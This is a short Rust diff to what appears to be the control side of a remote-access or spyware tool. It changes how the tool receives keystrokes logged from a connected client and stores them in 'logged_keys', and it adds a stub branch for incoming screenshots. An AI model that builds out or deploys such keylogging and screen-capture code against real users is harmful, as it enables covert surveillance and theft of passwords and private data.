@@ -58,13 +58,16 @@ where
         while let Ok(event) = app.client.app_receiver.try_recv() {
             match event {
                 ClientEvent::Connected(addr) => { app.client_addr = addr.to_string() },
-                ClientEvent::Data(bytes) => { 
-                    let data = std::str::from_utf8(&bytes).expect("cannot decode bytes to str");
-                    if data.ends_with("keystroke_reader") {
-                        let key = data.replace("keystroke_reader", "");
-                        app.logged_keys.push_str(key.as_str());
-                    };
-                },
+                ClientEvent::Data(mut bytes) => { 
+                    if bytes.ends_with(b"keystroke_reader") {
+                        bytes.truncate(bytes.len() - b"keystroke_reader".len());
+                        let key = std::str::from_utf8(&bytes)?;
+                        app.logged_keys.push_str(key);
+                    } else if bytes.ends_with(b"screenshot") {
+                        bytes.truncate(bytes.len() - b"screenshot".len());
+                        
+                    }
+                },  
                 ClientEvent::Disconnected => { app.client_addr = String::new() },
             }
         }
